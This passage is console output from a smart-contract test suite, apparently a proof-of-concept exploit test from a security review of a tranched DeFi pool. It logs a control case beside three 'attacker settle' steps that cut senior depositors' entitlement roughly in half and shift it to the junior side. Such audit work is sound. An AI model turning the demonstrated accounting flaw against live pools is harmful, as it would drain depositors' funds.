    projected junior         0
    projected max senior wd  0
    projected max junior wd  0
    getFreeAssets            0
  control projected senior   150000000000
  control projected junior   0
  attacker settle #1
    pool cash                50160000000
    stored senior principal  50160000000
    stored senior HWM        150000000000
    stored junior principal  0
    pending recapitalization 99840000000
    unassigned               0
    projected senior         50160000000
    projected junior         0
    projected max senior wd  480000000
    projected max junior wd  0
    getFreeAssets            0
  attacker settle #2
    pool cash                50160000000
    stored senior principal  50160000000
    stored senior HWM        99840000000
    stored junior principal  0
    pending recapitalization 49680000000
    unassigned               0
    projected senior         50160000000
    projected junior         0
    projected max senior wd  50160000000
    projected max junior wd  0
    getFreeAssets            480000000
  attacker settle #3
    pool cash                50160000000
    stored senior principal  50160000000
    stored senior HWM        99840000000
    stored junior principal  0
    pending recapitalization 0
    unassigned               0
    projected senior         50160000000
    projected junior         0
    projected max senior wd  50160000000
    projected max junior wd  0
    getFreeAssets            50160000000
  senior entitlement before  99840000000
  senior entitlement after   49680000000
  attack projected senior    99840000000
  attack projected junior    50160000000
Suite result: ok. 3 passed; 0 failed; 0 skipped; finished in 37.59ms (57.11ms CPU time)
Ran 1 test suite in 39.71ms (37.59ms CPU time): 3 tests passed, 0 failed, 0 skipped (3 total tests)
```

